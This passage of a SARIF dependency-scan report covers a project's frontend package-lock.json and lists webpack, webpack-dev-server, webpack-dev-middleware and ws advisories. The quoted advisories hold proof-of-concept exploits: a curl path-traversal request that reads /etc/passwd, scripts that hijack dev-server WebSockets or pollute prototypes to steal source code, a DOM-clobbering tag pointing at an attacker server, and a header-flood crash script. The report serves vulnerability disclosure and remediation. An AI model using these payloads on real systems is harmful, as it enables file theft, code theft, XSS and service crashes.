"0de4b561c9e40e15873e7a01d7d187c3"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?ua-parser-js","index": 42 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/ua-parser-js@0.7.31"}]}]}, {"ruleId": "CVE-2024-29180","level": "warning","message": {"text": "CVE-2024-29180 - Prior to versions 7.1.0, 6.1.2, and 5.3.4, the webpack-dev-middleware development middleware for devpack does not validate the supplied URL address sufficiently before returning the local file. It is possible to access any file on the developer's machine. The middleware can either work with the physical filesystem when reading the files or it can use a virtualized in-memory `memfs` filesystem. If `writeToDisk` configuration option is set to `true`, the physical filesystem is used. The `getFilenameFromUrl` method is used to parse URL and build the local file path. The public path prefix is stripped from the URL, and the `unsecaped` path suffix is appended to the `outputPath`. As the URL is not unescaped and normalized automatically before calling the midlleware, it is possible to use `%2e` and `%2f` sequences to perform path traversal attack.\n\nDevelopers using `webpack-dev-server` or `webpack-dev-middleware` are affected by the issue. When the project is started, an attacker might access any file on the developer's machine and exfiltrate the content. If the development server is listening on a public IP address (or `0.0.0.0`), an attacker on the local network can access the local files without any interaction from the victim (direct connection to the port). If the server allows access from third-party domains, an attacker can send a malicious link to the victim. When visited, the client side script can connect to the local server and exfiltrate the local files. Starting with fixed versions 7.1.0, 6.1.2, and 5.3.4, the URL is unescaped and normalized before any further processing."},"partialFingerprints": {"vulnerabilityHash": "c3910d09c03018545aca7f40460a72bb"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?webpack-dev-middleware","index": 43 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/webpack-dev-middleware@5.3.0"}]}]}, {"ruleId": "GHSA-wr3j-pwj9-hqq6","level": "warning","message": {"text": "GHSA-wr3j-pwj9-hqq6 - ### Summary\n_The **webpack-dev-middleware** middleware does not validate the supplied URL address sufficiently before returning the local file. It is possible to access any file on the developer's machine._\n\n### Details\nThe middleware can either work with the physical filesystem when reading the files or it can use a virtualized in-memory _memfs_ filesystem.\nIf _writeToDisk_ configuration option is set to **true**, the physical filesystem is used:\n[https:\/\/github.com\/webpack\/webpack-dev-middleware\/blob\/7ed24e0b9f53ad1562343f9f517f0f0ad2a70377\/src\/utils\/setupOutputFileSystem.js#L21](https:\/\/github.com\/webpack\/webpack-dev-middleware\/blob\/7ed24e0b9f53ad1562343f9f517f0f0ad2a70377\/src\/utils\/setupOutputFileSystem.js#L21)\n\nThe _**getFilenameFromUrl**_ method is used to parse URL and build the local file path.\nThe public path prefix is stripped from the URL, and the **unsecaped** path suffix is appended to the _outputPath_:\n[https:\/\/github.com\/webpack\/webpack-dev-middleware\/blob\/7ed24e0b9f53ad1562343f9f517f0f0ad2a70377\/src\/utils\/getFilenameFromUrl.js#L82](https:\/\/github.com\/webpack\/webpack-dev-middleware\/blob\/7ed24e0b9f53ad1562343f9f517f0f0ad2a70377\/src\/utils\/getFilenameFromUrl.js#L82)\nAs the URL is not unescaped and normalized automatically before calling the midlleware, it is possible to use _%2e_ and _%2f_ sequences to perform path traversal attack.\n\n### PoC\n_A blank project can be created containing the following configuration file **webpack.config.js**:_\n`module.exports = {\n  devServer: {\n    devMiddleware: {\n      writeToDisk: true\n    }\n  }\n};\n`\n\nWhen started, it is possible to access any local file, e.g. _\/etc\/passwd_:\n`$ curl localhost:8080\/public\/..%2f..%2f..%2f..%2f..\/etc\/passwd`\n```\nroot:x:0:0:root:\/root:\/bin\/bash\ndaemon:x:1:1:daemon:\/usr\/sbin:\/usr\/sbin\/nologin\nbin:x:2:2:bin:\/bin:\/usr\/sbin\/nologin\nsys:x:3:3:sys:\/dev:\/usr\/sbin\/nologin\nsync:x:4:65534:sync:\/bin:\/bin\/sync\ngames:x:5:60:games:\/usr\/games:\/usr\/sbin\/nologin\n```\n\n### Impact\nThe developers using _webpack-dev-server_ or _webpack-dev-middleware_ are affected by the issue. When the project is started, an attacker might access any file on the developer's machine and exfiltrate the content (e.g. password, configuration files, private source code, ...).\n\nIf the development server is listening on a public IP address (or **0.0.0.0**), an attacker on the local network can access the local files without any interaction from the victim (direct connection to the port).\n\nIf the server allows access from third-party domains (CORS, **_Allow-Access-Origin: *_** ), an attacker can send a malicious link to the victim. When visited, the client side script can connect to the local server and exfiltrate the local files.\n\n### Recommendation\nThe URL should be unescaped and normalized before any further processing."},"partialFingerprints": {"vulnerabilityHash": "f1200e8634ed2871684443d14eeceb89"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?webpack-dev-middleware","index": 43 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/webpack-dev-middleware@5.3.0"}]}]}, {"ruleId": "CVE-2025-30360","level": "warning","message": {"text": "CVE-2025-30360 - webpack-dev-server allows users to use webpack with a development server that provides live reloading. Prior to version 5.2.1, webpack-dev-server users' source code may be stolen when you access a malicious web site with non-Chromium based browser. The `Origin` header is checked to prevent Cross-site WebSocket hijacking from happening, which was reported by CVE-2018-14732. But webpack-dev-server always allows IP address `Origin` headers. This allows websites that are served on IP addresses to connect WebSocket. An attacker can obtain source code via a method similar to that used to exploit CVE-2018-14732. Version 5.2.1 contains a patch for the issue.\n\nSonatype's research suggests that this CVE's details differ from those defined at NVD. See https:\/\/ossindex.sonatype.org\/vulnerability\/CVE-2025-30360 for details"},"partialFingerprints": {"vulnerabilityHash": "87302e30255eb2df3cd8f94ea8f13f16"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?webpack-dev-server","index": 44 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/webpack-dev-server@4.7.3"}]}]}, {"ruleId": "GHSA-9jgg-88mc-972h","level": "warning","message": {"text": "GHSA-9jgg-88mc-972h - ### Summary\nSource code may be stolen when you access a malicious web site with non-Chromium based browser.\n\n### Details\nThe `Origin` header is checked to prevent Cross-site WebSocket hijacking from happening which was reported by CVE-2018-14732.\nBut webpack-dev-server always allows IP address `Origin` headers.\nhttps:\/\/github.com\/webpack\/webpack-dev-server\/blob\/55220a800ba4e30dbde2d98785ecf4c80b32f711\/lib\/Server.js#L3113-L3127\nThis allows websites that are served on IP addresses to connect WebSocket.\nBy using the same method described in [the article](https:\/\/blog.cal1.cn\/post\/Sniffing%20Codes%20in%20Hot%20Module%20Reloading%20Messages) linked from CVE-2018-14732, the attacker get the source code.\n\nrelated commit: https:\/\/github.com\/webpack\/webpack-dev-server\/commit\/72efaab83381a0e1c4914adf401cbd210b7de7eb (note that `checkHost` function was only used for Host header to prevent DNS rebinding attacks so this change itself is fine.\n\nThis vulnerability does not affect Chrome 94+ (and other Chromium based browsers) users due to [the non-HTTPS private access blocking feature](https:\/\/developer.chrome.com\/blog\/private-network-access-update#chrome_94).\n\n### PoC\n1. Download [reproduction.zip](https:\/\/github.com\/user-attachments\/files\/18418233\/reproduction.zip) and extract it\n2. Run `npm i`\n3. Run `npx webpack-dev-server`\n4. Open `http:\/\/{ipaddress}\/?target=http:\/\/localhost:8080&file=main` with a non-Chromium browser (I used Firefox 134.0.1)\n5. Edit `src\/index.js` in the extracted directory\n6. You can see the content of `src\/index.js`\n\n![image](https:\/\/github.com\/user-attachments\/assets\/7ce3cad7-1a4d-4778-baae-1adae5e93ba4)\n\nThe script in the POC site is:\n```js\nwindow.webpackHotUpdate = (...args) => {\n    console.log(...args);\n    for (i in args[1]) {\n        document.body.innerText = args[1][i].toString() + document.body.innerText\n\t    console.log(args[1][i])\n    }\n}\n\nlet params = new URLSearchParams(window.location.search);\nlet target = new URL(params.get('target') || 'http:\/\/127.0.0.1:8080');\nlet file = params.get('file')\nlet wsProtocol = target.protocol === 'http:' ? 'ws' : 'wss';\nlet wsPort = target.port;\nvar currentHash = '';\nvar currentHash2 = '';\nlet wsTarget = `${wsProtocol}:\/\/${target.hostname}:${wsPort}\/ws`;\nws = new WebSocket(wsTarget);\nws.onmessage = event => {\n    console.log(event.data);\n    if (event.data.match('\"type\":\"ok\"')) {\n        s = document.createElement('script');\n        s.src = `${target}${file}.${currentHash2}.hot-update.js`;\n        document.body.appendChild(s)\n    }\n    r = event.data.match(\/\"([0-9a-f]{20})\"\/);\n    if (r !== null) {\n        currentHash2 = currentHash;\n        currentHash = r[1];\n        console.log(currentHash, currentHash2);\n    }\n}\n```\n\n### Impact\nThis vulnerability can result in the source code to be stolen for users that uses a predictable port and uses a non-Chromium based browser."},"partialFingerprints": {"vulnerabilityHash": "6fe72633b3cd3b1ec295d7ba0a11bc1d"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?webpack-dev-server","index": 44 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/webpack-dev-server@4.7.3"}]}]}, {"ruleId": "CVE-2025-30359","level": "warning","message": {"text": "CVE-2025-30359 - webpack-dev-server allows users to use webpack with a development server that provides live reloading. Prior to version 5.2.1, webpack-dev-server users' source code may be stolen when they access a malicious web site. Because the request for classic script by a script tag is not subject to same origin policy, an attacker can inject a malicious script in their site and run the script. Note that the attacker has to know the port and the output entrypoint script path. Combined with prototype pollution, the attacker can get a reference to the webpack runtime variables. By using `Function::toString` against the values in `__webpack_modules__`, the attacker can get the source code. Version 5.2.1 contains a patch for the issue."},"partialFingerprints": {"vulnerabilityHash": "bc4efc8b92900b96183ae2a0b229093c"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?webpack-dev-server","index": 44 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/webpack-dev-server@4.7.3"}]}]}, {"ruleId": "GHSA-4v9v-hfq4-rm2v","level": "warning","message": {"text": "GHSA-4v9v-hfq4-rm2v - ### Summary\nSource code may be stolen when you access a malicious web site.\n\n### Details\nBecause the request for classic script by a script tag is not subject to same origin policy, an attacker can inject `<script src=\"http:\/\/localhost:8080\/main.js\">` in their site and run the script. Note that the attacker has to know the port and the output entrypoint script path. Combined with prototype pollution, the attacker can get a reference to the webpack runtime variables.\nBy using `Function::toString` against the values in `__webpack_modules__`, the attacker can get the source code.\n\n### PoC\n1. Download [reproduction.zip](https:\/\/github.com\/user-attachments\/files\/18426585\/reproduction.zip) and extract it\n2. Run `npm i`\n3. Run `npx webpack-dev-server`\n4. Open `https:\/\/e29c9a88-a242-4fb4-9e64-b24c9d29b35b.pages.dev\/`\n5. You can see the source code output in the document and the devtools console.\n\n![image](https:\/\/github.com\/user-attachments\/assets\/9d4dcdca-5d24-4c84-a7b4-feb1782bca09)\n\nThe script in the POC site is:\n```js\nlet moduleList\nconst onHandlerSet = (handler) => {\n  console.log('h', handler)\n  moduleList = handler.require.m\n}\n\nconst originalArrayForEach = Array.prototype.forEach\nArray.prototype.forEach = function forEach(callback, thisArg) {\n  callback((handler) => {\n    onHandlerSet(handler)\n  })\n  originalArrayForEach.call(this, callback, thisArg)\n  Array.prototype.forEach = originalArrayForEach\n}\n\nconst script = document.createElement('script')\nscript.src = 'http:\/\/localhost:8080\/main.js'\nscript.addEventListener('load', () => {\n  console.log(moduleList)\n  for (const key in moduleList) {\n    const p = document.createElement('p')\n    const title = document.createElement('strong')\n    title.textContent = key\n    const code = document.createElement('code')\n    code.textContent = moduleList[key].toString()\n    p.append(title, ':', document.createElement('br'), code)\n    document.body.appendChild(p)\n  }\n})\ndocument.head.appendChild(script)\n```\n\nThis script uses the function generated by [`renderRequire`](https:\/\/github.com\/webpack\/webpack\/blob\/3919c844eca394d73ca930e4fc5506fb86e2b094\/lib\/javascript\/JavascriptModulesPlugin.js#L1383).\n```js\n    \/\/ The require function\n    function __webpack_require__(moduleId) {\n        \/\/ Check if module is in cache\n        var cachedModule = __webpack_module_cache__[moduleId];\n        if (cachedModule !== undefined) {\n            return cachedModule.exports;\n        }\n        \/\/ Create a new module (and put it into the cache)\n        var module = __webpack_module_cache__[moduleId] = {\n            \/\/ no module.id needed\n            \/\/ no module.loaded needed\n            exports: {}\n        };\n        \/\/ Execute the module function\n        var execOptions = {\n            id: moduleId,\n            module: module,\n            factory: __webpack_modules__[moduleId],\n            require: __webpack_require__\n        };\n        __webpack_require__.i.forEach(function(handler) {\n            handler(execOptions);\n        });\n        module = execOptions.module;\n        execOptions.factory.call(module.exports, module, module.exports, execOptions.require);\n        \/\/ Return the exports of the module\n        return module.exports;\n    }\n```\nEspecially, it uses the fact that `Array::forEach` is called for `__webpack_require__.i` and `execOptions` contains `__webpack_require__`.\nIt uses prototype pollution against `Array::forEach` to extract `__webpack_require__` reference.\n\n### Impact\nThis vulnerability can result in the source code to be stolen for users that uses a predictable port and output path for the entrypoint script.\n\n<details>\n<summary>Old content<\/summary>\n\n### Summary\nSource code may be stolen when you use [`output.iife: false`](https:\/\/webpack.js.org\/configuration\/output\/#outputiife) and access a malicious web site.\n\n### Details\nWhen `output.iife: false` is set, some global variables for the webpack runtime are declared on the `window` object (e.g. `__webpack_modules__`).\nBecause the request for classic script by a script tag is not subject to same origin policy, an attacker can inject `<script src=\"http:\/\/localhost:8080\/main.js\">` in their site and run the script. Note that the attacker has to know the port and the output entrypoint script path. By running that, the webpack runtime variables will be declared on the `window` object.\nBy using `Function::toString` against the values in `__webpack_modules__`, the attacker can get the source code.\n\nI pointed out `output.iife: false`, but if there are other options that makes the webpack runtime variables to be declared on the `window` object, the same will apply for those cases.\n\n### PoC\n1. Download [reproduction.zip](https:\/\/github.com\/user-attachments\/files\/18409777\/reproduction.zip) and extract it\n2. Run `npm i`\n3. Run `npx webpack-dev-server`\n4. Open `https:\/\/852aafa3-5f83-44da-9fc6-ea116d0e3035.pages.dev\/`\n5. Open the devtools console.\n6. You can see the content of `src\/index.js` and other scripts loaded.\n\n![image](https:\/\/github.com\/user-attachments\/assets\/87801607-57bb-4656-bc0d-2bfbe207f436)\n\nThe script in the POC site is:\n```js\nconst script = document.createElement('script')\nscript.src = 'http:\/\/localhost:8080\/main.js'\nscript.addEventListener('load', () => {\n    for (const module in window.__webpack_modules__) {\n        console.log(`${module}:`, window.__webpack_modules__[module].toString())\n    }\n})\ndocument.head.appendChild(script)\n```\n\n### Impact\nThis vulnerability can result in the source code to be stolen for users that has `output.iife: false` option set and uses a predictable port and output path for the entrypoint script.\n\n<\/details>"},"partialFingerprints": {"vulnerabilityHash": "449ed06fc7ceba7584a572c28fd64ccd"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?webpack-dev-server","index": 44 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/webpack-dev-server@4.7.3"}]}]}, {"ruleId": "CVE-2023-28154","level": "warning","message": {"text": "CVE-2023-28154 - Webpack 5 before 5.76.0 does not avoid cross-realm object access. ImportParserPlugin.js mishandles the magic comment feature. An attacker who controls a property of an untrusted object can obtain access to the real global object.\n\nSonatype's research suggests that this CVE's details differ from those defined at NVD. See https:\/\/ossindex.sonatype.org\/vulnerability\/CVE-2023-28154 for details"},"partialFingerprints": {"vulnerabilityHash": "1e32af5f5a41e2c694ffaff0031e9b19"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?webpack","index": 45 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/webpack@5.67.0"}]}]}, {"ruleId": "GHSA-hc6q-2mpp-qw7j","level": "warning","message": {"text": "GHSA-hc6q-2mpp-qw7j - Webpack 5 before 5.76.0 does not avoid cross-realm object access. ImportParserPlugin.js mishandles the magic comment feature. An attacker who controls a property of an untrusted object can obtain access to the real global object."},"partialFingerprints": {"vulnerabilityHash": "5e22d05bdbb009aef7804fa50affc784"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?webpack","index": 45 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/webpack@5.67.0"}]}]}, {"ruleId": "GHSA-4vvj-4cpr-p986","level": "warning","message": {"text": "GHSA-4vvj-4cpr-p986 - ### Summary\n\nWe discovered a DOM Clobbering vulnerability in Webpack\u2019s `AutoPublicPathRuntimeModule`. The DOM Clobbering gadget in the module can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an `img` tag with an unsanitized `name` attribute) are present.\n\nWe found the real-world exploitation of this gadget in the Canvas LMS which allows XSS attack happens through an javascript code compiled by Webpack (the vulnerable part is from Webpack). We believe this is a severe issue. If Webpack\u2019s code is not resilient to DOM Clobbering attacks, it could lead to significant security vulnerabilities in any web application using Webpack-compiled code.\n\n\n### Details\n\n#### Backgrounds\n\nDOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:\n\n[1] https:\/\/scnps.co\/papers\/sp23_domclob.pdf\n[2] https:\/\/research.securitum.com\/xss-in-amp4email-dom-clobbering\/\n\n\n#### Gadgets found in Webpack\n\nWe identified a DOM Clobbering vulnerability in Webpack\u2019s `AutoPublicPathRuntimeModule`. When the `output.publicPath` field in the configuration is not set or is set to `auto`, the following code is generated in the bundle to dynamically resolve and load additional JavaScript files:\n\n```\n\/******\/ \t\/* webpack\/runtime\/publicPath *\/\n\/******\/ \t(() => {\n\/******\/ \t\tvar scriptUrl;\n\/******\/ \t\tif (__webpack_require__.g.importScripts) scriptUrl = __webpack_require__.g.location + \"\";\n\/******\/ \t\tvar document = __webpack_require__.g.document;\n\/******\/ \t\tif (!scriptUrl && document) {\n\/******\/ \t\t\tif (document.currentScript)\n\/******\/ \t\t\t\tscriptUrl = document.currentScript.src;\n\/******\/ \t\t\tif (!scriptUrl) {\n\/******\/ \t\t\t\tvar scripts = document.getElementsByTagName(\"script\");\n\/******\/ \t\t\t\tif(scripts.length) {\n\/******\/ \t\t\t\t\tvar i = scripts.length - 1;\n\/******\/ \t\t\t\t\twhile (i > -1 && (!scriptUrl || !\/^http(s?):\/.test(scriptUrl))) scriptUrl = scripts[i--].src;\n\/******\/ \t\t\t\t}\n\/******\/ \t\t\t}\n\/******\/ \t\t}\n\/******\/ \t\t\/\/ When supporting browsers where an automatic publicPath is not supported you must specify an output.publicPath manually via configuration\n\/******\/ \t\t\/\/ or pass an empty string (\"\") and set the __webpack_public_path__ variable from your code to use your own logic.\n\/******\/ \t\tif (!scriptUrl) throw new Error(\"Automatic publicPath is not supported in this browser\");\n\/******\/ \t\tscriptUrl = scriptUrl.replace(\/#.*$\/, \"\").replace(\/\\?.*$\/, \"\").replace(\/\\\/[^\\\/]+$\/, \"\/\");\n\/******\/ \t\t__webpack_require__.p = scriptUrl;\n\/******\/ \t})();\n```\n\nHowever, this code is vulnerable to a DOM Clobbering attack. The lookup on the line with `document.currentScript` can be shadowed by an attacker, causing it to return an attacker-controlled HTML element instead of the current script element as intended. In such a scenario, the `src` attribute of the attacker-controlled element will be used as the `scriptUrl` and assigned to `__webpack_require__.p`. If additional scripts are loaded from the server, `__webpack_require__.p` will be used as the base URL, pointing to the attacker's domain. This could lead to arbitrary script loading from the attacker's server, resulting in severe security risks.\n\n### PoC\n\nPlease note that we have identified a real-world exploitation of this vulnerability in the Canvas LMS. Once the issue has been patched, I am willing to share more details on the exploitation. For now, I\u2019m providing a demo to illustrate the concept.\n\nConsider a website developer with the following two scripts, `entry.js` and `import1.js`, that are compiled using Webpack:\n\n```\n\/\/ entry.js\nimport('.\/import1.js')\n  .then(module => {\n    module.hello();\n  })\n  .catch(err => {\n    console.error('Failed to load module', err);\n  });\n```\n\n```\n\/\/ import1.js\nexport function hello () {\n  console.log('Hello');\n}\n```\n\nThe webpack.config.js is set up as follows:\n```\nconst path = require('path');\n\nmodule.exports = {\n  entry: '.\/entry.js', \/\/ Ensure the correct path to your entry file\n  output: {\n    filename: 'webpack-gadgets.bundle.js', \/\/ Output bundle file\n    path: path.resolve(__dirname, 'dist'), \/\/ Output directory\n    publicPath: \"auto\", \/\/ Or leave this field not set\n  },\n  target: 'web',\n  mode: 'development',\n};\n```\n\nWhen the developer builds these scripts into a bundle and adds it to a webpage, the page could load the `import1.js` file from the attacker's domain, `attacker.controlled.server`. The attacker only needs to insert an `img` tag with the `name` attribute set to `currentScript`. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.\n\n```\n<!DOCTYPE html>\n<html>\n<head>\n  <title>Webpack Example<\/title>\n  <!-- Attacker-controlled Script-less HTML Element starts--!>\n  <img name=\"currentScript\" src=\"https:\/\/attacker.controlled.server\/\"><\/img>\n  <!-- Attacker-controlled Script-less HTML Element ends--!>\n<\/head>\n<script src=\".\/dist\/webpack-gadgets.bundle.js\"><\/script>\n<body>\n<\/body>\n<\/html>\n```\n\n### Impact\n\nThis vulnerability can lead to cross-site scripting (XSS) on websites that include Webpack-generated files and allow users to inject certain scriptless HTML tags with improperly sanitized name or id attributes.\n\n### Patch\n\nA possible patch to this vulnerability could refer to the Google Closure project which makes itself resistant to DOM Clobbering attack: https:\/\/github.com\/google\/closure-library\/blob\/b312823ec5f84239ff1db7526f4a75cba0420a33\/closure\/goog\/base.js#L174\n\n```\n\/******\/ \t\/* webpack\/runtime\/publicPath *\/\n\/******\/ \t(() => {\n\/******\/ \t\tvar scriptUrl;\n\/******\/ \t\tif (__webpack_require__.g.importScripts) scriptUrl = __webpack_require__.g.location + \"\";\n\/******\/ \t\tvar document = __webpack_require__.g.document;\n\/******\/ \t\tif (!scriptUrl && document) {\n\/******\/ \t\t\tif (document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT') \/\/ Assume attacker cannot control script tag, otherwise it is XSS already :>\n\/******\/ \t\t\t\tscriptUrl = document.currentScript.src;\n\/******\/ \t\t\tif (!scriptUrl) {\n\/******\/ \t\t\t\tvar scripts = document.getElementsByTagName(\"script\");\n\/******\/ \t\t\t\tif(scripts.length) {\n\/******\/ \t\t\t\t\tvar i = scripts.length - 1;\n\/******\/ \t\t\t\t\twhile (i > -1 && (!scriptUrl || !\/^http(s?):\/.test(scriptUrl))) scriptUrl = scripts[i--].src;\n\/******\/ \t\t\t\t}\n\/******\/ \t\t\t}\n\/******\/ \t\t}\n\/******\/ \t\t\/\/ When supporting browsers where an automatic publicPath is not supported you must specify an output.publicPath manually via configuration\n\/******\/ \t\t\/\/ or pass an empty string (\"\") and set the __webpack_public_path__ variable from your code to use your own logic.\n\/******\/ \t\tif (!scriptUrl) throw new Error(\"Automatic publicPath is not supported in this browser\");\n\/******\/ \t\tscriptUrl = scriptUrl.replace(\/#.*$\/, \"\").replace(\/\\?.*$\/, \"\").replace(\/\\\/[^\\\/]+$\/, \"\/\");\n\/******\/ \t\t__webpack_require__.p = scriptUrl;\n\/******\/ \t})();\n```\n\nPlease note that if we do not receive a response from the development team within three months, we will disclose this vulnerability to the CVE agent."},"partialFingerprints": {"vulnerabilityHash": "d71b7c77e9f5bb4621a7c1787b411975"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?webpack","index": 45 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/webpack@5.67.0"}]}]}, {"ruleId": "CVE-2024-43788","level": "warning","message": {"text": "CVE-2024-43788 - Webpack is a module bundler. Its main purpose is to bundle JavaScript files for usage in a browser, yet it is also capable of transforming, bundling, or packaging just about any resource or asset. The webpack developers have discovered a DOM Clobbering vulnerability in Webpack\u2019s `AutoPublicPathRuntimeModule`. The DOM Clobbering gadget in the module can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an `img` tag with an unsanitized `name` attribute) are present. Real-world exploitation of this gadget has been observed in the Canvas LMS which allows a XSS attack to happen through a javascript code compiled by Webpack (the vulnerable part is from Webpack). DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. This vulnerability can lead to cross-site scripting (XSS) on websites that include Webpack-generated files and allow users to inject certain scriptless HTML tags with improperly sanitized name or id attributes. This issue has been addressed in release version 5.94.0. All users are advised to upgrade. There are no known workarounds for this issue."},"partialFingerprints": {"vulnerabilityHash": "8bf25d624f5fd7238efc608bf84057cf"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?webpack","index": 45 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/webpack@5.67.0"}]}]}, {"ruleId": "CVE-2024-37890","level": "warning","message": {"text": "CVE-2024-37890 - ws is an open source WebSocket client and server for Node.js. A request with a number of headers exceeding theserver.maxHeadersCount threshold could be used to crash a ws server. The vulnerability was fixed in ws@8.17.1 (e55e510) and backported to ws@7.5.10 (22c2876), ws@6.2.3 (eeb76d3), and ws@5.2.4 (4abd8f6). In vulnerable versions of ws, the issue can be mitigated in the following ways: 1. Reduce the maximum allowed length of the request headers using the --max-http-header-size=size and\/or the maxHeaderSize options so that no more headers than the server.maxHeadersCount limit can be sent. 2. Set server.maxHeadersCount to 0 so that no limit is applied."},"partialFingerprints": {"vulnerabilityHash": "5aa10e4a02ded35ee1565a58762e9db1"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?ws","index": 46 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/ws@8.2.3"}]}]}, {"ruleId": "GHSA-3h5v-q93c-6h6q","level": "warning","message": {"text": "GHSA-3h5v-q93c-6h6q - ### Impact\n\nA request with a number of headers exceeding the[`server.maxHeadersCount`][] threshold could be used to crash a ws server.\n\n### Proof of concept\n\n```js\nconst http = require('http');\nconst WebSocket = require('ws');\n\nconst wss = new WebSocket.Server({ port: 0 }, function () {\n  const chars = \"!#$%&'*+-.0123456789abcdefghijklmnopqrstuvwxyz^_`|~\".split('');\n  const headers = {};\n  let count = 0;\n\n  for (let i = 0; i < chars.length; i++) {\n    if (count === 2000) break;\n\n    for (let j = 0; j < chars.length; j++) {\n      const key = chars[i] + chars[j];\n      headers[key] = 'x';\n\n      if (++count === 2000) break;\n    }\n  }\n\n  headers.Connection = 'Upgrade';\n  headers.Upgrade = 'websocket';\n  headers['Sec-WebSocket-Key'] = 'dGhlIHNhbXBsZSBub25jZQ==';\n  headers['Sec-WebSocket-Version'] = '13';\n\n  const request = http.request({\n    headers: headers,\n    host: '127.0.0.1',\n    port: wss.address().port\n  });\n\n  request.end();\n});\n```\n\n### Patches\n\nThe vulnerability was fixed in ws@8.17.1 (https:\/\/github.com\/websockets\/ws\/commit\/e55e5106f10fcbaac37cfa89759e4cc0d073a52c) and backported to ws@7.5.10 (https:\/\/github.com\/websockets\/ws\/commit\/22c28763234aa75a7e1b76f5c01c181260d7917f), ws@6.2.3 (https:\/\/github.com\/websockets\/ws\/commit\/eeb76d313e2a00dd5247ca3597bba7877d064a63), and ws@5.2.4 (https:\/\/github.com\/websockets\/ws\/commit\/4abd8f6de4b0b65ef80b3ff081989479ed93377e)\n\n### Workarounds\n\nIn vulnerable versions of ws, the issue can be mitigated in the following ways:\n\n1. Reduce the maximum allowed length of the request headers using the [`--max-http-header-size=size`][] and\/or the [`maxHeaderSize`][] options so that no more headers than the `server.maxHeadersCount` limit can be sent.\n2. Set `server.maxHeadersCount` to `0` so that no limit is applied.\n\n### Credits\n\nThe vulnerability was reported by [Ryan LaPointe](https:\/\/github.com\/rrlapointe) in https:\/\/github.com\/websockets\/ws\/issues\/2230.\n\n### References\n\n- https:\/\/github.com\/websockets\/ws\/issues\/2230\n- https:\/\/github.com\/websockets\/ws\/pull\/2231\n\n[`--max-http-header-size=size`]: https:\/\/nodejs.org\/api\/cli.html#--max-http-header-sizesize\n[`maxHeaderSize`]: https:\/\/nodejs.org\/api\/http.html#httpcreateserveroptions-requestlistener\n[`server.maxHeadersCount`]: https:\/\/nodejs.org\/api\/http.html#servermaxheaderscount\n"},"partialFingerprints": {"vulnerabilityHash": "71752c779fe4e76b6b12392fd9c07f6b"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?ws","index": 46 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/ws@8.2.3"}]}]}]}]}